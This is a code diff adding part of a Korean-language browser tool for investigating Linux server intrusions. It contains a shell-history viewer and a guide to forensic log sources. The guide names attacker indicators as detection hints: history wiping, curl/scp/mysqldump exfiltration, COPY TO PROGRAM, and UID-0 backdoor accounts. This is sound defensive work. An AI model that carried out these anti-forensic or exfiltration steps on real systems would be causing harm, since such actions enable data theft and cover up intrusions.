+      <div class="mono hf-p">${esc(x.path)}</div>
+      <div class="hf-m"><b>${esc(x.user)}</b> · ${x.entries.length.toLocaleString()}줄${risky?` · <span style="color:var(--crit)">위험 ${risky}</span>`:''}${x.db?' · DB 기록':''}</div></button>`;
+  }).join('');
+  const notes = [];
+  if(!h.entries.length) notes.push('파일이 비어 있습니다. 공격자가 기록을 지웠거나(> ~/.bash_history), 기록이 저장되지 않게 했을 수 있습니다.');
+  else if(!h.with_ts) notes.push('이 파일에는 실행 시각이 없습니다(HISTTIMEFORMAT 미설정). 명령의 순서만 알 수 있고, 언제 실행했는지는 auditd·auth.log 와 맞춰 봐야 합니다.');
+  else if(h.with_ts < h.entries.length) notes.push(`일부 줄(${h.entries.length-h.with_ts}개)에만 시각이 없습니다. 시각 기록 설정 전의 오래된 명령입니다.`);
+  const tamper = h.entries.find(([,,c])=>HIST_TAMPER.test(c));
+  if(tamper) notes.push(`${tamper[0]}번째 줄에서 기록을 지우거나 끄는 명령(${tamper[2]})이 실행됐습니다. 그 뒤에 친 명령은 이 파일에 없을 수 있으니 auditd 기록과 비교하세요.`);
+  notes.push('bash 는 보통 로그아웃할 때 기록을 파일에 씁니다. 접속이 강제로 끊기면 마지막 명령들이 빠질 수 있습니다.');
+  let rows = h.entries.map(([ln,ts,cmd])=>({ln,ts,cmd,e:bySrcLine[h.path+':'+ln]}));
+  if(hv.risky) rows = rows.filter(r=>r.e && sr(r.e.sev)>=2);
+  if(q) rows = rows.filter(r=>(r.cmd+' '+(r.e?explText(r.e):'')).toLowerCase().includes(q));
+  const shown = rows.slice(0, 3000);
+  return `<div class="hgrid"><aside class="panel hlist"><h2>히스토리 파일 <small>${HIST.length}개</small></h2>${list}</aside>
+    <section class="panel" style="min-width:0">
+      <h2 class="mono" style="word-break:break-all">${esc(h.path)} <small>${esc(h.user)} 계정 · ${h.entries.length.toLocaleString()}줄${h.mtime?` · 파일 수정 ${fmt(h.mtime)}`:''}</small></h2>
+      <div class="hnotes">${notes.map(n=>`<div>${esc(n)}</div>`).join('')}</div>
+      <div class="toolbar"><input class="search" id="hq" placeholder="이 파일에서 검색 (명령, 해설)" value="${esc(hv.q)}">
+        <label class="tgl"><input type="checkbox" id="hrisky" ${hv.risky?'checked':''}>위험한 줄만</label>
+        <label class="tgl"><input type="checkbox" id="hexplain" ${st.explain?'checked':''}>해설 보기</label>
+        <span class="count">${rows.length.toLocaleString()}줄</span></div>
+      <div class="hcode">${shown.map(({ln,ts,cmd,e})=>`<div class="hl${e?' '+e.sev:''}${e?' click':''}" ${e?`data-act="hline" data-v="${e._i}"`:''}>
+        <span class="hn">${ln}</span><span class="ht">${ts!=null?fmt(ts).slice(5):''}</span>
+        <div class="hc"><code>${esc(cmd)}</code>${e && sr(e.sev)>=1?` ${sevB(e.sev)} ${catB(e.cat)}`:''}${e?explH(e,false):''}</div></div>`).join('')
+        || '<div class="empty">조건에 맞는 줄이 없습니다.</div>'}</div>
+      ${rows.length>shown.length?`<div class="empty">앞의 ${shown.length.toLocaleString()}줄만 표시했습니다. 검색으로 좁혀 보세요.</div>`:''}
+    </section></div>`;
+}
+
+/* ── 로그 가이드 ── */
+const GUIDE = [
+  { k:'auth', name:'SSH·계정 로그', files:'/var/log/auth.log* (Ubuntu·Debian)\n/var/log/secure* (RHEL·CentOS·Rocky)', kind:'SSH/계정', prio:1,
+    what:'SSH 로그인 성공·실패, 접속 IP와 포트, 사용한 인증 방식(비밀번호/키)과 키 지문, sudo 로 실행한 명령, su 전환, 계정 생성·비밀번호 변경, SFTP 파일 전송.',
+    look:['"Failed password" 가 한 IP 에서 수십~수천 번 → 무차별 대입 공격','그 IP 의 "Accepted password" → 침입 성공 시각 (사고의 시작점)','"Accepted publickey" 의 키 지문이 처음 보는 것 → 공격자가 심어 둔 키','sudo COMMAND= 줄 → root 권한으로 무엇을 했는지','useradd / passwd → 백도어 계정'],
+    limit:'연도가 안 적혀 있고(syslog 형식) 보통 1주 단위로 로테이션돼 auth.log.1, .2.gz … 로 넘어갑니다. 공격자가 root 면 줄 단위로 지울 수 있어 wtmp·audit 과 교차 확인이 필요합니다.',
+    cmd:"grep -E 'Accepted|Failed' /var/log/auth.log | tail -50" },
+  { k:'history', name:'셸 히스토리', files:'/root/.bash_history\n/home/계정/.bash_history (.zsh_history 등)', kind:'셸 히스토리', prio:1,
+    what:'사용자가 셸에 직접 입력한 명령 원문. 파이프(|)·리다이렉트(>) 까지 그대로 남아 공격자가 무엇을 하려 했는지 가장 읽기 쉽습니다.',
+    look:['wget/curl 로 받은 파일과 그 주소 → 악성코드 유포지','mysqldump, tar, scp, curl -T → 데이터 유출 흐름','useradd, authorized_keys, crontab → 백도어','history -c, unset HISTFILE → 흔적 삭제 시도 (그 뒤는 비어 있을 수 있음)'],
+    limit:'기본 설정에서는 실행 시각이 없습니다(#1696… 같은 줄이 있으면 시각 있음). 로그아웃할 때 저장되므로 강제 종료되면 빠지고, 공격자가 쉽게 지우거나 끌 수 있어 "없다고 안 했다"는 뜻은 아닙니다.',
+    cmd:'cat -n /root/.bash_history' },
+  { k:'audit', name:'auditd (감사 로그)', files:'/var/log/audit/audit.log*', kind:'auditd', prio:1,
+    what:'커널이 기록하는 실행 기록. 실행된 모든 프로그램(EXECVE)의 인자, 실행 계정, 로그인 세션 번호(ses), 작업 폴더까지 남습니다.',
+    look:['히스토리에는 없는데 audit 에만 있는 명령 → 기록을 끈 뒤 실행한 명령','scp -f 파일 → 외부로 파일이 복사됨','auid(원래 로그인 계정)와 uid(실행 계정)가 다르면 sudo/su 로 권한을 바꾼 것','ses 번호로 어떤 SSH 접속에서 실행됐는지 연결'],
+    limit:'auditd 가 설치·실행 중이고 execve 감시 규칙이 있어야 명령이 남습니다(기본은 로그인 정도만). 인자는 16진수로 인코딩되는 경우가 있어 그냥 읽기 어렵습니다(이 뷰어가 풀어서 보여 줌).',
+    cmd:'ausearch -m EXECVE -i --start today' },
+  { k:'wtmp', name:'로그인 기록 (wtmp / btmp)', files:'/var/log/wtmp (성공·로그아웃)\n/var/log/btmp (실패)', kind:'wtmp', prio:2,
+    what:'터미널 로그인·로그아웃 시각과 접속 IP. btmp 에는 실패한 로그인과 시도한 계정 이름.',
+    look:['auth.log 에는 없는데 wtmp 에만 있는 로그인 → auth.log 를 지운 흔적','로그인~로그아웃 시간으로 공격자가 얼마나 머물렀는지'],
+    limit:'바이너리 파일이라 cat 으로 못 봅니다. SFTP·scp 처럼 터미널 없는 접속은 남지 않습니다.',
+    cmd:'last -f /var/log/wtmp -i | head\nlastb -f /var/log/btmp -i | head' },
+  { k:'mysql', name:'MySQL / MariaDB 로그', files:'/var/log/mysql/*.log (general log)', kind:'MySQL', prio:2,
+    what:'general log 를 켜 두면 DB 에 들어온 모든 쿼리와 접속 계정·호스트가 남습니다.',
+    look:['"SELECT /*!40001 SQL_NO_CACHE */ * FROM" 이 테이블마다 연속 → mysqldump 로 통째 덤프','INTO OUTFILE / LOAD_FILE → DB 를 통해 서버 파일을 쓰거나 읽음','평소와 다른 호스트·계정의 Connect'],
+    limit:'general log 는 기본으로 꺼져 있어 대부분 서버에는 없습니다. 그럴 땐 셸 히스토리·auditd 의 mysqldump 명령이 유일한 단서입니다.',
+    cmd:"grep -n 'SQL_NO_CACHE' /var/log/mysql/mysql.log | head" },
+  { k:'pg', name:'PostgreSQL 로그', files:'/var/log/postgresql/*.log', kind:'PostgreSQL', prio:2,
+    what:'접속 기록(log_connections), 실행한 SQL(log_statement), 인증 실패.',
+    look:['application_name=pg_dump 접속 → DB 덤프','COPY … TO stdout 연속 → 테이블 데이터 추출','COPY … TO PROGRAM → DB 를 통해 OS 명령 실행'],
+    limit:'접속·SQL 기록은 설정을 켜야 남습니다. 기본은 오류 위주라 덤프 흔적이 없을 수 있습니다.',
+    cmd:"grep -n 'pg_dump\\|COPY' /var/log/postgresql/*.log" },
+  { k:'ftp', name:'파일 전송 로그', files:'auth.log 의 internal-sftp 줄\n/var/log/xferlog, vsftpd.log', kind:'FTP', prio:2,
+    what:'SFTP 로 열고 닫은 파일과 읽은/쓴 바이트 수, FTP 업로드·다운로드.',
+    look:['"bytes read" 가 큰 파일 → 외부로 내려받아 간 파일과 크기','/tmp 아래 숨김 폴더의 압축 파일 → 미리 묶어 둔 유출 자료'],
+    limit:'SFTP 파일 단위 기록은 sshd_config 에 "Subsystem sftp internal-sftp -l VERBOSE" 가 있어야 남습니다. scp 다운로드는 auditd 로만 보입니다.',
+    cmd:"grep 'internal-sftp' /var/log/auth.log | grep -E 'open|close'" },
+  { k:'etc', name:'계정·설정 파일', files:'/etc/passwd, ~/.ssh/authorized_keys,\ncrontab (/var/spool/cron, /etc/cron*)', kind:null, prio:3,
+    what:'로그는 아니지만 공격자가 남긴 백도어가 그대로 있는 곳입니다.',
+    look:['/etc/passwd 의 UID 0 계정 (root 말고 0 이 있으면 백도어)','authorized_keys 에 모르는 키','crontab 에 /tmp 나 숨김 폴더의 스크립트'],
+    limit:'이 뷰어는 /etc/passwd 만 읽습니다. authorized_keys·crontab 은 서버에서 직접 확인하세요.',
+    cmd:"awk -F: '$3==0' /etc/passwd\ncat /root/.ssh/authorized_keys\ncrontab -l; ls -la /etc/cron.*" },
+];
+function guideView(){
+  const loaded = new Set(M.sources.map(x=>x.kind));
+  const steps = `<div class="panel" style="margin-bottom:16px"><h2>어떤 순서로 보면 되나요?</h2>
+    <ol class="gsteps">
+      <li><b>언제, 어디로 들어왔나</b> — SSH·계정 로그에서 무차별 대입과 첫 로그인 성공(IP, 계정, 시각)을 찾습니다. → <a data-act="guidego" data-v="ips">공격자 IP</a></li>
+      <li><b>들어와서 무엇을 했나</b> — 그 접속(세션) 동안 실행된 명령을 셸 히스토리·auditd 로 봅니다. → <a data-act="guidego" data-v="sessions">세션</a> · <a data-act="guidego" data-v="history">히스토리</a></li>
+      <li><b>무엇을 가져갔나</b> — DB 덤프, 압축, 업로드·SFTP·scp 다운로드를 찾습니다. → <a data-act="kpi-go" data-v="3">DB 덤프</a> · <a data-act="kpi-go" data-v="4">파일 전송</a></li>
+      <li><b>다시 들어올 문을 남겼나</b> — 계정 생성, SSH 키, crontab, 숨김 폴더의 실행 파일. → <a data-act="kpi-go" data-v="5">지속성·흔적삭제</a></li>
+      <li><b>흔적을 지웠나</b> — history 삭제, 로그 비우기, auth.log 와 wtmp·audit 이 서로 안 맞는 곳.</li>
+    </ol></div>`;
+  return steps + `<div class="gcards">${GUIDE.map(g=>{
+    const has = g.kind && loaded.has(g.kind);
+    return `<div class="panel gcard">
+      <div class="g-h"><h2 style="margin:0">${esc(g.name)}</h2>${g.prio===1?'<span class="badge red">핵심</span>':''}
+        ${g.kind?`<span class="badge${has?' ok':''}">${has?'✓ 이번 분석에 포함':'이번 분석에 없음'}</span>`:''}</div>
+      <pre class="g-files">${esc(g.files)}</pre>
+      <div class="g-sec"><div class="g-t">무엇이 남나</div><div>${esc(g.what)}</div></div>
+      <div class="g-sec"><div class="g-t">이렇게 보면 됩니다</div><ul>${g.look.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      <div class="g-sec"><div class="g-t">한계·주의</div><div style="color:var(--muted)">${esc(g.limit)}</div></div>
+      <div class="g-sec"><div class="g-t">서버에서 직접 볼 때</div><pre class="raw">${esc(g.cmd)}</pre></div></div>`;
+  }).join('')}</div>`;
+}
+
+/* ── 소스 ── */
+function sources(){
+  return `<div class="tablewrap"><table class="srcs" style="min-width:560px"><thead><tr><th>로그 파일</th><th>종류</th><th style="text-align:right">이벤트</th></tr></thead><tbody>
+    ${M.sources.map(s=>`<tr><td class="mono">${esc(s.path)}</td><td>${esc(s.kind)}</td><td style="text-align:right;font-variant-numeric:tabular-nums">${s.events.toLocaleString()}</td></tr>`).join('')||'<tr><td colspan="3" class="empty">읽은 로그가 없습니다.</td></tr>'}
+  </tbody></table></div>
+  ${M.notes.length?`<div class="notes" style="margin-top:16px">${M.notes.map(n=>`<div>${esc(n)}</div>`).join('')}</div>`:''}
+  <p style="color:var(--muted);font-size:12.5px;margin-top:16px">분석 루트: <span class="mono">${esc(M.root)}</span> · 시간대 ${esc(M.tz_label)} · secviewer ${esc(M.version)}</p>`;
+}
+
+/* ── 렌더 / 이벤트 ── */
+function render(){
+  renderNav();
+  const v = {overview, timeline, ips, sessions, sources, upload:uploadView, history:historyView, guide:guideView}[st.view];
+  $('#main').innerHTML = v();
+  if(st.view==='timeline'){
+    const q = $('#q'); let t;
+    q.oninput = ()=>{ clearTimeout(t); t=setTimeout(()=>{ st.q=q.value; st.limit=300; const pos=q.selectionStart; render(); const n=$('#q'); n.focus(); n.setSelectionRange(pos,pos); },160); };
+    $('#sev').onchange = ev=>{ st.minSev=+ev.target.value; render(); };
+    $('#noise').onchange = ev=>{ st.hideNoise=ev.target.checked; render(); };
+    $('#explain') && ($('#explain').onchange = ev=>{ st.explain=ev.target.checked; try{ localStorage.setItem('secview-explain', st.explain?'1':'0'); }catch(_){} render(); });
+  }
+  if(st.view==='history'){
+    const q = $('#hq'); let t;
+    if(q) q.oninput = ()=>{ clearTimeout(t); t=setTimeout(()=>{ hv.q=q.value; const pos=q.selectionStart; render(); const n=$('#hq'); n.focus(); n.setSelectionRange(pos,pos); },160); };
+    const rk = $('#hrisky'); if(rk) rk.onchange = ev=>{ hv.risky=ev.target.checked; render(); };
+    const hx = $('#hexplain'); if(hx) hx.onchange = ev=>{ st.explain=ev.target.checked; try{ localStorage.setItem('secview-explain', st.explain?'1':'0'); }catch(_){} render(); };
+  }
+}
+function openEvent(i){
+  const e = E[i];
+  st.open = new Set([i]);
+  const f = {cats:new Set(Object.keys(CATS)), minSev:0, q:'', ip:null, user:null, sid:e.sid||null, hideNoise:!isNoise(e)};
+  if(!e.sid){ f.ip = e.ip||null; }
+  const rows = (Object.assign(st,f), filtered());
+  st.limit = Math.max(300, rows.indexOf(e)+50);
+  st.view='timeline'; render();
+  const el = document.querySelector(`tr.ev[data-v="${i}"]`); if(el) el.scrollIntoView({block:'center'});
+}
+document.addEventListener('click', ev=>{
+  const t = ev.target.closest('[data-act]'); if(!t) return;
+  const a = t.dataset.act, v = t.dataset.v;
+  if(a!=='row') ev.stopPropagation();
+  switch(a){
+    case 'view': go(v, v==='timeline'?{}:{ip:null,sid:null}); break;
+    case 'kpi': window._kpi[+v](); break;
+    case 'kpi-go': overview(); window._kpi[+v](); break;
+    case 'kpi-high': go('timeline',{minSev:3,cats:new Set(Object.keys(CATS)),ip:null,user:null,sid:null,q:''}); break;
+    case 'cat': st.cats.has(v)?st.cats.delete(v):st.cats.add(v); st.limit=300; render(); break;
+    case 'allcats': st.cats = st.cats.size===Object.keys(CATS).length?new Set():new Set(Object.keys(CATS)); render(); break;
+    case 'ip': go('timeline',{ip:v,sid:null,cats:new Set(Object.keys(CATS))}); break;
+    case 'user': go('timeline',{user:v}); break;
+    case 'clr': st[v]=null; render(); break;
+    case 'more': st.limit+=500; render(); break;
+    case 'csv': csv(); break;
+    case 'row': { const i=+v; st.open.has(i)?st.open.delete(i):st.open.add(i); const y=window.scrollY; render(); window.scrollTo(0,y); break; }
+    case 'ev': openEvent(+v); break;
+    case 'sess': go('sessions',{sid:v,ip:null}); setTimeout(()=>{ const el=document.getElementById('sess-'+v); if(el){ el.open=true; el.scrollIntoView({block:'start'}); window.scrollBy(0,-110);} },0); break;
+    case 'ipsess': go('sessions',{ip:v}); break;
+    case 'ipcard': go('ips'); setTimeout(()=>{ const el=document.getElementById('ip-'+v); if(el){ el.scrollIntoView({block:'center'}); el.style.outline='2px solid var(--accent)'; } },0); break;
+    case 'pick': $('#fin').click(); break;
+    case 'hfile': hv.file=+v; hv.q=''; render(); window.scrollTo(0,0); break;
+    case 'hline': { const e = E[+v]; if(e) openEvent(+v); break; }
+    case 'guidego': go(v); break;
+    case 'pickdir': $('#din').click(); break;
+  }
+});
+renderMeta();
+render();
+checkServer();
+})();
+</script>
+</body>
+</html>
